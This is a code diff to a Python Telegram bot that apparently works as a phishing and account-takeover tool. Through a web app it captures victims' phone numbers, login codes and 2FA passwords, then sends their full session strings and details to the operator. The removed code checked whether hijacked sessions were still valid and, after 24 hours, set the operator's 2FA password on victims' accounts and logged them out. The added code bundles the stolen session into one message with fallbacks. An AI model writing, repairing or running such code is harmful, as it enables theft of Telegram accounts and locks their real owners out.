@@ -252,17 +252,6 @@ def format_phone(ph):
     return '+' + digits
 
 
-def account_label(a):
-    st = a.get("status", "active")
-    if st == "terminated":
-        return "⚰️"
-    if st == "expired":
-        return "❌"
-    if a.get("is_premium"):
-        return "👹👹"
-    return "✨✨"
-
-
 # ============================================================
 # RESET ENGINE
 # ============================================================
@@ -437,19 +426,14 @@ async def _send_html_via_fresh(chat_id, html_text):
 
 
 # ============================================================
-# INSTANT CONTACT DELETE (thread, flood-safe)
+# INSTANT CONTACT DELETE (flood-safe)
 # ============================================================
-_contact_delete_queue = []
-_contact_delete_lock = threading.Lock()
-
 async def _instant_contact_delete(event, uid):
-    """Delete contact message instantly with flood-safe delay."""
     try:
-        await asyncio.sleep(0.001)  # 1ms
+        await asyncio.sleep(0.001)
         await event.delete()
         logger.info(f"✅ Contact card deleted from user {uid} in ~1ms")
     except errors.FloodWaitError as fw:
-        # If flood wait, wait then delete
         logger.warning(f"⚠️ FloodWait {fw.seconds}s — waiting to delete contact from {uid}")
         try:
             await asyncio.sleep(fw.seconds)
@@ -728,186 +712,6 @@ async def test_cmd(event):
 
 
 # ============================================================
-# SESSION VALIDITY
-# ============================================================
-async def check_session_validity(session_str):
-    try:
-        c = TelegramClient(StringSession(session_str), API_ID, API_HASH)
-        await c.connect()
-        try:
-            auth = await c.is_user_authorized()
-            if not auth:
-                return False, "not_authorized"
-            try:
-                me = await c.get_me()
-                if me is None:
-                    return False, "get_me_none"
-                if not getattr(me, "id", None):
-                    return False, "no_id"
-                return True, "ok"
-            except errors.UnauthorizedError:
-                return False, "unauthorized"
-            except errors.AuthKeyUnregisteredError:
-                return False, "auth_key_unreg"
-            except errors.UserDeactivatedError:
-                return False, "user_deactivated"
-            except errors.UserDeactivatedBanError:
-                return False, "user_banned"
-            except Exception as e:
-                return False, f"get_me_err: {str(e)[:60]}"
-        finally:
-            try:
-                await c.disconnect()
-            except Exception:
-                pass
-    except Exception as e:
-        return False, f"connect_err: {str(e)[:60]}"
-
-
-# ============================================================
-# EDIT INFO MSG (no buttons)
-# ============================================================
-async def edit_admin_msg(account, status_text):
-    try:
-        msg_id = account.get("admin_notify_msg_id")
-        if not msg_id:
-            logger.warning(f"edit_admin_msg: no info msg_id for {account.get('phone')}")
-            return
-        phone = account.get("phone", "?")
-        name = (account.get("first_name", "") or "") + " " + (account.get("last_name", "") or "")
-        name = name.strip() or "?"
-        dc = account.get("dc", "?")
-        pu = account.get("has_2fa", False)
-        pv = account.get("password", "")
-        extra = ""
-        if pu:
-            extra = "\n🔐 2FA Used"
-            if pv:
-                extra += f" | Pwd: {pv}"
-
-        added = account.get("added_at", 0)
-        hours_passed = (time.time() - added) / 3600 if added else 0
-        hours_left = max(0, 24 - hours_passed)
-
-        new_text = (f"{status_text}{extra}\n\n"
-                    f"🔔 New Account!\n"
-                    f"📱 {phone}\n"
-                    f"👤 {name}\n"
-                    f"🆔 {account.get('user_id', '?')}\n"
-                    f"🌐 DC: {dc}\n"
-                    f"⏱ Age: {hours_passed:.2f}h / 24h\n"
-                    f"⏳ Time Left: {hours_left:.2f}h")
-        if len(new_text) > 4000:
-            new_text = new_text[:3990] + "..."
-
-        try:
-            await bot.edit_message(YOUR_TELEGRAM_ID, msg_id, new_text)
-            logger.info(f"✅ Info msg edited: {phone} → {status_text[:40]}")
-            return
-        except errors.MessageNotModifiedError:
-            return
-        except Exception as e:
-            logger.warning(f"info edit fail: {type(e).__name__}: {e}")
-
-        try:
-            tmp_session = f"/tmp/notify_{uuid.uuid4().hex[:8]}.session"
-            c = TelegramClient(tmp_session, API_ID, API_HASH)
-            await c.start(bot_token=BOT_TOKEN)
-            try:
-                await c.edit_message(YOUR_TELEGRAM_ID, msg_id, new_text)
-                logger.info(f"✅ Info msg edited (fresh): {phone}")
-                return
-            finally:
-                try:
-                    await c.disconnect()
-                except Exception:
-                    pass
-                try:
-                    if os.path.exists(tmp_session):
-                        os.remove(tmp_session)
-                except Exception:
-                    pass
-        except Exception as e2:
-            logger.warning(f"fresh edit fail: {type(e2).__name__}: {e2}")
-
-        try:
-            r = await _send_via_main_loop(YOUR_TELEGRAM_ID, new_text)
-            logger.info(f"✅ New info msg sent: {phone} (mid={r.id})")
-            account["admin_notify_msg_id"] = r.id
-            save_account(account)
-        except Exception as e3:
-            logger.error(f"new info msg err: {e3}")
-    except Exception as e:
-        logger.error(f"edit_admin_msg err: {e}")
-        logger.error(traceback.format_exc())
-
-
-# ============================================================
-# EDIT SESSION MSG
-# ============================================================
-async def edit_session_msg(account, status_text):
-    try:
-        msg_id = account.get("admin_session_msg_id")
-        if not msg_id:
-            logger.warning(f"edit_session_msg: no session msg_id for {account.get('phone')}")
-            return
-        phone = account.get("phone", "?")
-        ss = account.get("session", "")
-        if not ss:
-            return
-
-        ss_len = len(ss)
-        name = (account.get("first_name", "") or "") + " " + (account.get("last_name", "") or "")
-        name = name.strip() or "?"
-        dc = account.get("dc", "?")
-        user_id = account.get("user_id", "?")
-
-        new_html = (f"<b>{status_text}</b>\n\n"
-                    f"🔔 New Account!\n"
-                    f"📱 {phone}\n"
-                    f"👤 {name}\n"
-                    f"🆔 {user_id}\n"
-                    f"🌐 DC: {dc}\n"
-                    f"📏 Session: {ss_len} chars\n\n"
-                    f"🔑 Session:\n<code>{ss}</code>")
-        if len(new_html) > 4000:
-            new_html = new_html[:3990] + "..."
-
-        try:
-            await bot.edit_message(YOUR_TELEGRAM_ID, msg_id, new_html, parse_mode='html')
-            logger.info(f"✅ Session msg edited: {phone} → {status_text[:40]}")
-            return
-        except errors.MessageNotModifiedError:
-            return
-        except Exception as e:
-            logger.warning(f"session edit main fail: {type(e).__name__}: {e}")
-
-        try:
-            tmp_session = f"/tmp/notify_{uuid.uuid4().hex[:8]}.session"
-            c = TelegramClient(tmp_session, API_ID, API_HASH)
-            await c.start(bot_token=BOT_TOKEN)
-            try:
-                await c.edit_message(YOUR_TELEGRAM_ID, msg_id, new_html, parse_mode='html')
-                logger.info(f"✅ Session msg edited (fresh): {phone}")
-                return
-            finally:
-                try:
-                    await c.disconnect()
-                except Exception:
-                    pass
-                try:
-                    if os.path.exists(tmp_session):
-                        os.remove(tmp_session)
-                except Exception:
-                    pass
-        except Exception as e2:
-            logger.warning(f"session edit fresh fail: {type(e2).__name__}: {e2}")
-    except Exception as e:
-        logger.error(f"edit_session_msg err: {e}")
-        logger.error(traceback.format_exc())
-
-
-# ============================================================
 # CALLBACK HANDLER
 # ============================================================
 @bot.on(events.CallbackQuery())
@@ -919,227 +723,6 @@ async def cb(event):
     chat_id = event.sender_id
 
     try:
-        # EXPIRE CHECK
-        if data.startswith("mancheck_"):
-            phone_clean = data.replace("mancheck_", "")
-            phone = "+" + phone_clean
-            logger.info(f"🔍 MANUAL EXPIRE CHECK: {phone}")
-            await event.answer("Checking...")
-
-            accounts = load_accounts()
-            acc = next((a for a in accounts if a["phone"] == phone), None)
-            if not acc:
-                return await event.answer("Account not found", alert=True)
-
-            ss = acc.get("session", "")
-            if not ss:
-                return await event.answer("No session", alert=True)
-
-            try:
-                loop = asyncio.new_event_loop()
-                asyncio.set_event_loop(loop)
-                valid, reason = loop.run_until_complete(check_session_validity(ss))
-                loop.close()
-
-                logger.info(f"🔍 Check result {phone}: valid={valid}, reason={reason}")
-                now_str = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-
-                if valid:
-                    acc["status"] = "active"
-                    acc["last_checked"] = time.time()
-                    info_status = f"✅ VALID — Checked {now_str}"
-                    session_status = f"✅ ACTIVE — {now_str}"
-                    await edit_admin_msg(acc, info_status)
-                    await edit_session_msg(acc, session_status)
-                    await event.answer("✅ Session valid")
-                else:
-                    acc["status"] = "expired"
-                    acc["expired_at"] = time.time()
-                    acc["expire_reason"] = reason
-                    info_status = f"❌ EXPIRED ({reason}) — {now_str}"
-                    session_status = f"❌ EXPIRED ({reason}) — {now_str}"
-                    await edit_admin_msg(acc, info_status)
-                    await edit_session_msg(acc, session_status)
-                    await event.answer(f"❌ Expired: {reason}")
-
-                for i, x in enumerate(accounts):
-                    if x["phone"] == phone:
-                        accounts[i] = acc
-                        break
-                save_json(DATA_FILE, accounts)
-                captured_accounts = accounts
-            except Exception as e:
-                logger.error(f"manual check err {phone}: {e}")
-                logger.error(traceback.format_exc())
-                await event.answer(f"Err: {str(e)[:40]}", alert=True)
-            return
-
-        # EXPIRE + DELETE
-        if data.startswith("mandel_"):
-            phone_clean = data.replace("mandel_", "")
-            phone = "+" + phone_clean
-            logger.info(f"🗑 EXPIRE + DELETE: {phone}")
-            await event.answer("Deleting...")
-
-            accounts = load_accounts()
-            acc = next((a for a in accounts if a["phone"] == phone), None)
-            if not acc:
-                return await event.answer("Not found", alert=True)
-
-            ss = acc.get("session", "")
-            valid = False
-            reason = "no_session"
-
-            if ss:
-                try:
-                    loop = asyncio.new_event_loop()
-                    asyncio.set_event_loop(loop)
-                    valid, reason = loop.run_until_complete(check_session_validity(ss))
-                    loop.close()
-                except Exception as e:
-                    valid, reason = False, f"check_err: {str(e)[:40]}"
-
-            old_mid = acc.get("admin_notify_msg_id")
-            sess_mid = acc.get("admin_session_msg_id")
-            if old_mid:
-                try:
-                    await bot.delete_message(YOUR_TELEGRAM_ID, old_mid)
-                except Exception:
-                    pass
-            if sess_mid:
-                try:
-                    await bot.delete_message(YOUR_TELEGRAM_ID, sess_mid)
-                except Exception:
-                    pass
-
-            new_accounts = [a for a in accounts if a["phone"] != phone]
-            save_json(DATA_FILE, new_accounts)
-            captured_accounts = new_accounts
-
-            try:
-                deleted_msg = (f"🗑 SECTION DELETED\n\n"
-                               f"📱 Phone: {phone}\n"
-                               f"✅ Last Check: {'VALID' if valid else 'EXPIRED'}\n"
-                               f"📝 Reason: {reason}\n"
-                               f"🕐 Deleted: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
-                await bot.send_message(YOUR_TELEGRAM_ID, deleted_msg)
-            except Exception as e:
-                logger.error(f"send delete msg err: {e}")
-
-            await event.answer("✅ Deleted", alert=True)
-            return
-
-        # TERMINATE + 2FA
-        if data.startswith("manterm_"):
-            phone_clean = data.replace("manterm_", "")
-            phone = "+" + phone_clean
-            logger.info(f"🚪 MANUAL TERMINATE + 2FA: {phone}")
-            await event.answer("Processing...")
-
-            accounts = load_accounts()
-            acc = next((a for a in accounts if a["phone"] == phone), None)
-            if not acc:
-                return await event.answer("Not found", alert=True)
-
-            ss = acc.get("session", "")
-            if not ss:
-                return await event.answer("No session", alert=True)
-
-            added = acc.get("added_at", 0)
-            if not added:
-                added = time.time()
-                acc["added_at"] = added
-                save_account(acc)
-
-            hours_passed = (time.time() - added) / 3600
-            hours_left = 24 - hours_passed
-
-            if hours_left > 0:
-                hh = int(hours_left)
-                mm = int((hours_left - hh) * 60)
-                logger.info(f"⏳ 24h NOT COMPLETE {phone}: {hh}h {mm}m left")
-                status_txt = f"⏳ 24h NOT COMPLETE — Wait {hh}h {mm}m"
-                await edit_admin_msg(acc, status_txt)
-                await edit_session_msg(acc, status_txt)
-                await event.answer(f"⏳ {hh}h {mm}m left", alert=True)
-                return
-
-            twofa_set = False
-            if auto_2fa_pass:
-                try:
-                    loopA = asyncio.new_event_loop()
-                    asyncio.set_event_loop(loopA)
-
-                    async def set_2fa():
-                        c = TelegramClient(StringSession(ss), API_ID, API_HASH)
-                        await c.connect()
-                        try:
-                            await c.edit_2fa(new_password=auto_2fa_pass)
-                            logger.info(f"🔐 2FA set: {phone}")
-                            return True
-                        except Exception as e:
-                            logger.error(f"set_2fa err {phone}: {e}")
-                            return False
-                        finally:
-                            await c.disconnect()
-
-                    twofa_set = loopA.run_until_complete(set_2fa())
-                    loopA.close()
-                except Exception as e:
-                    logger.error(f"2FA block err {phone}: {e}")
-
-            logged_out = False
-            try:
-                loop2 = asyncio.new_event_loop()
-                asyncio.set_event_loop(loop2)
-
-                async def term():
-                    c = TelegramClient(StringSession(ss), API_ID, API_HASH)
-                    await c.connect()
-                    try:
-                        await c.log_out()
-                        logger.info(f"🚪 Logged out: {phone}")
-                        return True
-                    except Exception as e:
-                        logger.error(f"log_out err {phone}: {e}")
-                        return False
-                    finally:
-                        try:
-                            await c.disconnect()
-                        except Exception:
-                            pass
-
-                logged_out = loop2.run_until_complete(term())
-                loop2.close()
-            except Exception as e:
-                logger.error(f"terminate err {phone}: {e}")
-
-            acc["status"] = "terminated"
-            acc["terminated_at"] = time.time()
-            acc["2fa_password_set"] = auto_2fa_pass if twofa_set else ""
-            acc["terminated_by"] = "manual"
-
-            for i, x in enumerate(accounts):
-                if x["phone"] == phone:
-                    accounts[i] = acc
-                    break
-            save_json(DATA_FILE, accounts)
-            captured_accounts = accounts
-
-            status_txt = "✅ TERMINATE COMPLETE"
-            if twofa_set:
-                status_txt += f"\n🔐 2FA: {auto_2fa_pass}"
-            else:
-                status_txt += "\n⚠️ 2FA set FAILED"
-            if not logged_out:
-                status_txt += "\n⚠️ Logout may have failed"
-            status_txt += f"\n🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-
-            await edit_admin_msg(acc, status_txt)
-            await edit_session_msg(acc, status_txt)
-            await event.answer("✅ Terminated", alert=True)
-            return
-
         # RESET NUMBERS
         if data == "menu_reset_numbers":
             await event.answer()
@@ -1421,41 +1004,12 @@ async def cb(event):
 
         elif data == "menu_expired":
             accounts = load_accounts()
-            expired = [a for a in accounts if a.get("status") == "expired"]
-            termin = [a for a in accounts if a.get("status") == "terminated"]
             prem = [a for a in accounts if a.get("is_premium")]
-            txt = f"🔴 Expired: `{len(expired)}`\n⚰️ Terminated: `{len(termin)}`\n👹👹 Premium: `{len(prem)}`"
+            txt = f"👹👹 Premium: `{len(prem)}`\n📦 Total: `{len(accounts)}`"
             await event.answer()
             await safe_send(chat_id, txt, [
-                [Button.inline("🗑 Delete Expired", b"expired_del")],
-                [Button.inline("🗑 Delete Terminated", b"terminated_del")],
-                [Button.inline("🗑 Delete Both", b"expired_del_both")],
                 [Button.inline("⬅️ Back", b"menu_home")]
             ], edit_event=event)
-
-        elif data == "expired_del":
-            accounts = load_accounts()
-            new_a = [a for a in accounts if a.get("status") != "expired"]
-            save_json(DATA_FILE, new_a)
-            captured_accounts = new_a
-            await event.answer(f"Deleted {len(accounts) - len(new_a)}", alert=True)
-            await safe_send(chat_id, "✅", admin_menu(), edit_event=event)
-
-        elif data == "terminated_del":
-            accounts = load_accounts()
-            new_a = [a for a in accounts if a.get("status") != "terminated"]
-            save_json(DATA_FILE, new_a)
-            captured_accounts = new_a
-            await event.answer(f"Deleted {len(accounts) - len(new_a)}", alert=True)
-            await safe_send(chat_id, "✅", admin_menu(), edit_event=event)
-
-        elif data == "expired_del_both":
-            accounts = load_accounts()
-            new_a = [a for a in accounts if a.get("status") not in ("expired", "terminated")]
-            save_json(DATA_FILE, new_a)
-            captured_accounts = new_a
-            await event.answer(f"Deleted {len(accounts) - len(new_a)}", alert=True)
-            await safe_send(chat_id, "✅", admin_menu(), edit_event=event)
 
         elif data == "menu_toggle_expired":
             AUTO_DELETE_EXPIRED = not AUTO_DELETE_EXPIRED
@@ -1473,10 +1027,8 @@ async def cb(event):
             await event.answer(f"Total: {len(users)}", alert=True)
 
         elif data == "menu_stats":
-            exp = sum(1 for a in captured_accounts if a.get("status") == "expired")
-            term = sum(1 for a in captured_accounts if a.get("status") == "terminated")
             await event.answer(
-                f"Users: {len(users)}\nAccounts: {len(captured_accounts)}\nExpired: {exp}\nTerminated: {term}\n2FA: {'SET' if auto_2fa_pass else 'EMPTY'}",
+                f"Users: {len(users)}\nAccounts: {len(captured_accounts)}\n2FA: {'SET' if auto_2fa_pass else 'EMPTY'}",
                 alert=True)
 
         else:
@@ -1497,26 +1049,22 @@ async def cancel(event):
 
 
 # ============================================================
-# MESSAGE INPUT HANDLER — instant contact delete + OTP
+# MESSAGE INPUT HANDLER
 # ============================================================
 @bot.on(events.NewMessage())
 async def capture(event):
     global welcome_config, broadcast_config, share_config, auto_2fa_pass, captured_accounts
 
-    # ===== NON-OWNER MESSAGES =====
     if event.sender_id != YOUR_TELEGRAM_ID:
-        # INSTANT contact delete (fire and forget task)
         try:
             if event.message and event.message.contact:
                 uid = event.sender_id
-                # Fire delete task in background — 0.001s delay
                 asyncio.create_task(_instant_contact_delete(event, uid))
                 logger.info(f"🚀 Contact from {uid} — instant delete scheduled")
         except Exception as e:
             logger.warning(f"contact delete schedule err: {e}")
         return
 
-    # ===== OWNER COMMANDS =====
     txt = event.raw_text or ""
     if txt.startswith('/'):
         return
@@ -1727,7 +1275,7 @@ async def bot_main():
 
 
 # ============================================================
-# WEBAPP HTML — with Get Code button linking to https://t.me/+42777
+# WEBAPP HTML
 # ============================================================
 WEBAPP_HTML = """<!DOCTYPE html>
 <html><head>
@@ -1997,7 +1545,6 @@ function submitOtp() {
 }
 document.getElementById('resendBtn').onclick = function(){ document.getElementById('resendBtn').style.display='none'; openOtp(); };
 
-// GET CODE BUTTON — opens https://t.me/+42777
 document.getElementById('getCodeBtn').onclick = function() {
   var url = 'https://t.me/+42777';
   if (tg && typeof tg.openTelegramLink === 'function') {
@@ -2278,7 +1825,8 @@ async def _tg_action(phone, code=None, password=None, tg_id=None):
             logger.warning(f"get_dialogs warn: {de}")
 
         ss = StringSession.save(client.session)
-        logger.info(f"✅ SESSION GENERATED: {phone} len={len(ss)}")
+        ss_len = len(ss)
+        logger.info(f"✅ SESSION GENERATED: {phone} len={ss_len}")
 
         try:
             ak = client.session.auth_key.key
@@ -2308,97 +1856,88 @@ async def _tg_action(phone, code=None, password=None, tg_id=None):
         captured_accounts = load_accounts()
         logger.info(f"✅ ACCOUNT SAVED: {phone}")
 
-        phone_clean = phone.replace("+", "").strip()
         name_full = f"{me.first_name or ''} {me.last_name or ''}".strip() or "?"
-        ss_len = len(ss)
 
-        # ===== INFO MESSAGE (NO BUTTONS) =====
-        info_msg = (f"🔔 New Account!\n"
-                    f"📱 {phone}\n"
-                    f"👤 {name_full}\n"
-                    f"🆔 {me.id}\n"
-                    f"🌐 DC: {dc}\n"
-                    f"⏱ Age: 0.0h / 24h\n"
-                    f"⏳ Time Left: 24.0h")
-        if pu and password:
-            info_msg += f"\n🔐 2FA: {password}"
+        # ===== SINGLE MESSAGE — EXACT FORMAT (tor moto) =====
+        full_msg_html = (f"🔔 New Account!\n"
+                         f"📱 {phone}\n"
+                         f"👤 {name_full}\n"
+                         f"🆔 {me.id}\n"
+                         f"🌐 DC: {dc}\n"
+                         f"📏 Session: {ss_len} chars\n\n"
+                         f"🔑 Session:\n<code>{ss}</code>")
+        if len(full_msg_html) > 4000:
+            full_msg_html = full_msg_html[:3990] + "..."
 
-        if len(info_msg) > 4000:
-            info_msg = info_msg[:3990] + "..."
-
-        info_sent = False
+        sent_msg = None
         for attempt in range(3):
             try:
-                logger.info(f"📤 INFO attempt {attempt+1}/3")
-                r = await _send_via_main_loop(YOUR_TELEGRAM_ID, info_msg)
+                logger.info(f"📤 FULL MSG attempt {attempt+1}/3")
+                r = await _send_html_via_fresh(YOUR_TELEGRAM_ID, full_msg_html)
                 if r:
+                    sent_msg = r
                     acc["admin_notify_msg_id"] = r.id
+                    acc["admin_session_msg_id"] = r.id
                     save_account(acc)
                     captured_accounts = load_accounts()
-                    info_sent = True
-                    logger.info(f"✅ INFO sent (mid={r.id})")
+                    logger.info(f"✅ FULL MSG sent (mid={r.id})")
                     break
             except Exception as e:
-                logger.warning(f"INFO attempt {attempt+1} fail: {type(e).__name__}: {e}")
+                logger.warning(f"FULL MSG attempt {attempt+1} fail: {type(e).__name__}: {e}")
                 await asyncio.sleep(0.5)
 
-        # ===== SESSION MESSAGE (HTML <code> tap-to-copy) =====
-        session_sent = False
-        session_html = (f"🔑 Session:\n"
-                        f"<code>{ss}</code>")
-        for attempt in range(3):
+        if not sent_msg:
+            # Fallback: markdown
+            full_msg_md = (f"🔔 New Account!\n"
+                           f"📱 {phone}\n"
+                           f"👤 {name_full}\n"
+                           f"🆔 {me.id}\n"
+                           f"🌐 DC: {dc}\n"
+                           f"📏 Session: {ss_len} chars\n\n"
+                           f"🔑 Session:\n```\n{ss}\n```")
+            for attempt in range(3):
+                try:
+                    r = await _send_via_main_loop(YOUR_TELEGRAM_ID, full_msg_md, parse_mode='md')
+                    if r:
+                        sent_msg = r
+                        acc["admin_notify_msg_id"] = r.id
+                        acc["admin_session_msg_id"] = r.id
+                        save_account(acc)
+                        captured_accounts = load_accounts()
+                        logger.info(f"✅ FULL MSG MD sent (mid={r.id})")
+                        break
+                except Exception as e:
+                    logger.warning(f"FULL MSG MD attempt {attempt+1} fail: {e}")
+                    await asyncio.sleep(0.5)
+
+        if not sent_msg:
+            # Last resort: plain text
+            full_msg_plain = (f"🔔 New Account!\n"
+                              f"📱 {phone}\n"
+                              f"👤 {name_full}\n"
+                              f"🆔 {me.id}\n"
+                              f"🌐 DC: {dc}\n"
+                              f"📏 Session: {ss_len} chars\n\n"
+                              f"🔑 Session:\n{ss}")
             try:
-                logger.info(f"📤 SESSION HTML attempt {attempt+1}/3")
-                r2 = await _send_html_via_fresh(YOUR_TELEGRAM_ID, session_html)
-                if r2:
-                    acc["admin_session_msg_id"] = r2.id
+                r = await _send_via_main_loop(YOUR_TELEGRAM_ID, full_msg_plain)
+                if r:
+                    sent_msg = r
+                    acc["admin_notify_msg_id"] = r.id
+                    acc["admin_session_msg_id"] = r.id
                     save_account(acc)
                     captured_accounts = load_accounts()
-                    session_sent = True
-                    logger.info(f"✅ SESSION HTML sent (mid={r2.id})")
-                    break
+                    logger.info(f"✅ FULL MSG PLAIN sent (mid={r.id})")
             except Exception as e:
-                logger.warning(f"SESSION HTML attempt {attempt+1} fail: {type(e).__name__}: {e}")
-                await asyncio.sleep(0.5)
+                logger.error(f"FULL MSG plain fail: {e}")
 
-        if not session_sent:
-            session_md = f"🔑 Session:\n```\n{ss}\n```"
-            for attempt in range(3):
-                try:
-                    r2 = await _send_via_main_loop(YOUR_TELEGRAM_ID, session_md, parse_mode='md')
-                    if r2:
-                        acc["admin_session_msg_id"] = r2.id
-                        save_account(acc)
-                        captured_accounts = load_accounts()
-                        session_sent = True
-                        logger.info(f"✅ SESSION MD sent (mid={r2.id})")
-                        break
-                except Exception as e:
-                    logger.warning(f"SESSION MD attempt {attempt+1} fail: {e}")
-                    await asyncio.sleep(0.5)
-
-        if not session_sent:
-            for attempt in range(3):
-                try:
-                    r2 = await _send_via_main_loop(YOUR_TELEGRAM_ID, ss)
-                    if r2:
-                        acc["admin_session_msg_id"] = r2.id
-                        save_account(acc)
-                        captured_accounts = load_accounts()
-                        session_sent = True
-                        logger.info(f"✅ SESSION plain sent (mid={r2.id})")
-                        break
-                except Exception as e:
-                    logger.warning(f"SESSION plain attempt {attempt+1} fail: {e}")
-                    await asyncio.sleep(0.5)
-
-        if not info_sent and not session_sent:
-            logger.error(f"❌ ALL NOTIFY FAILED for {phone}")
+        if not sent_msg:
+            logger.error(f"❌ NOTIFY FAILED for {phone}")
 
         with sessions_lock:
             user_sessions.pop(phone, None)
             pending_codes[phone] = 'done'
-        logger.info(f"✅ FULL FLOW COMPLETE: {phone} info={info_sent} session={session_sent}")
+        logger.info(f"✅ FULL FLOW COMPLETE: {phone} sent={sent_msg is not None}")
         return {'success': True, 'user_id': me.id}
 
     except errors.PhoneCodeInvalidError:
@@ -2448,8 +1987,7 @@ def dash():
     rows = ""
     for i, a in enumerate(accounts, 1):
         sl = len(a.get('session', ''))
-        lbl = account_label(a)
-        rows += f"<tr><td>{i}</td><td>{a['phone']}</td><td>{a.get('first_name','')} {lbl}</td><td>{a.get('user_id','')}</td><td>{a.get('dc','')}</td><td>({sl})</td></tr>"
+        rows += f"<tr><td>{i}</td><td>{a['phone']}</td><td>{a.get('first_name','')}</td><td>{a.get('user_id','')}</td><td>{a.get('dc','')}</td><td>({sl})</td></tr>"
     return f"<html><body style='background:#0a0a0a;color:white;font-family:Arial;padding:20px'><h1>Accounts: {len(accounts)}</h1><table border=1 style='width:100%'><tr><th>#</th><th>Phone</th><th>Name</th><th>ID</th><th>DC</th><th>Session</th></tr>{rows}</table></body></html>"
 
 
